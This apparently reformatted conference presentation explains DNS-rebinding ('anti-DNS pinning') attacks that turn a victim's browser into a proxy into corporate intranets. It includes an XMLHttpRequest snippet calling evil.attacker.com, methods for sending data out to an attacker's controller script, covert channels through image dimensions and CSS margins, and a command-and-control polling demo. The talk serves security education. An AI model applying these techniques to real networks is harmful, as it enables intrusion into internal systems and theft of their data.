# Intranet Invasion Through Anti-DNS Pinning

**Author:** David Byrne, CISSP, MCSE  
**Role:** Security Architect  
**Organization:** EchoSatellite / Dish Network  
**Contact:** [PI:EMAIL]

## JavaScript Malware

- **Cross-Site Scripting (XSS)**
- **Port Scanning**
- **Website Fingerprinting**
- **Cross-Site Request Forgery (CSRF)**
- **Browser History Theft**
- **Self-Propagating Worms**

## Same Origin Policy

- **Origin and Definition:**
  - The same origin policy was introduced by Netscape in Navigator 2.0 when JavaScript first appeared.
  - According to Mozilla.org, "The same origin policy prevents documents or scripts loaded from one origin from getting or setting properties of a document from a different origin."
  - Both documents must share the same protocol, hostname, and port. IP addresses are not considered due to virtual hosts.
  - Cross-Site Scripting (XSS) circumvents this by injecting JavaScript into the targeted site. A properly secured site is generally not vulnerable without rare client-side vulnerabilities.

## Useful Data

| Component               | IP Address |
|-------------------------|------------|
| Victim Browser          | 13.1.2.3   |
| Attack Web Server       | 13.1.2.3   |
| Victim Web Server       | 10.4.5.6   |
| Attack DNS Server       | attacker.com |

### Attack Flow
1. **Request**: `13.1.2.3` -> `evil.attacker.com`
2. **Attack Request**: `10.4.5.6`

## DNS Pinning

- **Purpose:**
  - DNS pinning is designed to prevent DNS spoofing attacks by forcing a browser to cache the first DNS response for a hostname.
- **Historical Context:**
  - The first documented attack against DNS pinning was in 1996 by Princeton researchers, targeting the Java Virtual Machine (JVM). This attack is no longer viable.
- **RFC Compliance:**
  - DNS pinning may violate RFC 2616, which states that HTTP clients must observe the Time-To-Live (TTL) information reported by DNS to avoid being spoofed if a server's IP address changes.

## Defeating DNS-Pinning – Process Termination

### Steps:
1. **Payload Request**: Get the victim's browser to request an attack payload.
2. **Wait for Closure**: Wait for the browser to close or cause it to crash.
3. **Restart Browser**: Wait for the user to open the browser again.
4. **Reload Payload**: Get the browser to reload the payload from the cache.
5. **Initiate Request**: The payload initiates a request to the original attack server.
6. **DNS Requery**: The browser re-queries the DNS server, receiving the target server's IP address.
7. **Execute Payload**: The payload runs against the target server.

### Pros and Cons:
- **Pros:**
  - Difficult to defeat with browser design; the browser must re-query DNS eventually.
- **Cons:**
  - Defeated by clearing the cache on exit.
  - Hard to get the attack payload reloaded from the cache.
  - Very slow process.

## Defeating DNS-Pinning – Forcing Cache Reloads

### Historical Context:
- **First Documented**: September 2003 by Mohammad Haque.
- **Rediscovered**: August 2006 by Amit Klein.
- **Implementation**: Major browsers (IE & Firefox) do not fully implement DNS pinning.
- **Cache Dump**: If a web server becomes unavailable, the DNS cache is dumped.
- **Effective Attack**: Coordinating firewall and DNS changes can create an effective attack.
- **Platform Compatibility**: Techniques work on IE & Firefox, on both Windows and *NIX systems.

### Useful Data

| Component               | IP Address |
|-------------------------|------------|
| Victim Browser          | 13.1.2.3   |
| Attack Web Server       | 13.1.2.3   |
| Victim Web Server       | 10.4.5.6   |
| Attack DNS Server       | attacker.com |

### Attack Flow
1. **Request**: `13.1.2.3` -> `evil.attacker.com`
2. **Attack Request**: `10.4.5.6`

## XMLHTTPRequest Object

- **Functionality:**
  - The XMLHTTPRequest (XHR) object allows JavaScript to issue arbitrary HTTP GETs or POSTs back to the origin server.
  - Commonly used in AJAX sites like Google Maps.
  - Normally, it can only return text data.
  - Thanks to Marcus Granado (mgran.blogspot.com) for documenting how to retrieve binary data using the "x-user-defined" character set.

### Example Code
```javascript
var ua;
ua = new XMLHttpRequest();
ua.open('GET', 'http://evil.attacker.com', false);
ua.overrideMimeType('text/plain;charset=x-user-defined');
ua.send(body);
return "HTTP/1.0 " + ua.status + " " + ua.statusText + 
"\x0d\x0a" + ua.getAllResponseHeaders() + 
"\x0d\x0a\x0d\x0a" + ua.responseText;
```

## Sending Data to the Attack Server

- **Small Amounts of Text Data:**
  - Create an image object.
  - Set the source to a controller script on the attack server, passing text data in the query string.
  - Append the object to the document body.
- **Large Amounts of Data or Binary Data:**
  - Use an HTML form.
  - Store data in a text input box.
  - Set the form action to the controller script on the attack server.
  - Target an unused iframe.
  - Set the method to POST.
  - Use encoding type "multipart/form-data".

## Requesting Data from the Attack Server

- **Primary Method:**
  - Uses intentional XSS.
  - Load a script from the attack server, storing data in variables accessible by the requesting script.
  - Example: `data['request345'] = 'GET / HTTP/1.0\n…';`
  - Anti-XSS controls might break this.
  - No XSS is required for the demonstration.

### Alternatives:
- **Image Dimensions:**
  - Request a series of images from the attack server.
  - Measure their width and height, encoding one byte in each.
  - BMP files can be as small as 66 bytes with any dimensions.
- **Cascading Style Sheets:**
  - Request a style sheet from the attack server.
  - It contains style classes with margin settings.
  - Apply the class to a DIV tag and measure the margin.
  - Each margin can encode two bytes, allowing unlimited data in each CSS.

## Demonstration Environment

### Network Configuration
- **Internet Subnet**: 12.0.0.0/24
- **Corporate Subnet**: 10.0.0.0/24

| Device                   | IP Address        | Services           |
|--------------------------|-------------------|--------------------|
| Victim Workstation       | 10.0.0.100        | -                  |
| Linux Server             | 10.0.0.30         | HTTP, MySQL        |
| Windows Server           | 10.0.0.31         | HTTP, DNS, SMB     |
| Attack Server            | 12.0.0.51, 12.0.0.52 | HTTP, MySQL, DNS  |
| Attack Workstation       | 12.0.0.60         | -                  |
| XSS Infected Server      | 12.0.0.80         | HTTP               |

### VM Configuration
- **Internet Laptop**
  - Attack server VM
  - Attack workstation VM
  - XSS infected server VM
- **Corporate Laptop**
  - Windows server VM
  - Linux server VM
  - Victim workstation VM
- **DD-WRT Firewall**

## Demonstration Sequence

1. **Infection:**
   - The victim's browser visits a website infected with an XSS attack.
   - Example: `http://www.news-site.com/infected_page.asp`

2. **Load Attack Page:**
   - The malicious code causes the victim to load a page from the attack web server.
   - Example: `http://12.0.0.51/attack.html`

3. **Polling:**
   - Every 1.5 seconds, JavaScript from the attack page appends an image tag to the document body.
   - The source is set to the controller script with a command value indicating a poll.
   - Example: `http://12.0.0.51/cgi-bin/controller.pl?command=poll&sessionID=10`

4. **Session Recording:**
   - On the first poll, the controller script records the session in the database, allowing the attacker to see it in the console.
   - Example SQL: 
     ```sql
     INSERT INTO sessions (sessionID, externalIP, lastPoll, firstPoll, proxyState) VALUES (?, ?, ?, ?, ?)
     ```

5. **Command Execution:**
   - The controller script checks for new commands in the attack database.
   - Any commands are sent back to the victim browser as JavaScript statements.
   - Example: `alert('I own you');`

6. **Network Probing:**
   - The attacker probes the victim’s network using well-documented techniques.

7. **Start Proxy:**
   - The attacker starts an HTTP proxy server associated with the desired browser victim.
   - Example: `http://12.0.0.51/cgi-bin/controller.pl?command=startproxy&sessionid=10`

8. **Proxy Request Handling:**
   - When the attacker sends a request to the HTTP proxy, the proxy checks for previous requests to the same IP address and port.
   - Example: `http://10.0.0.30/`

9. **Random Hostname Generation:**
   - If this is the first request, the proxy creates a random hostname.

---

This revised version provides a more structured and professional presentation of the content, with clear headings, bullet points, and formatted code blocks.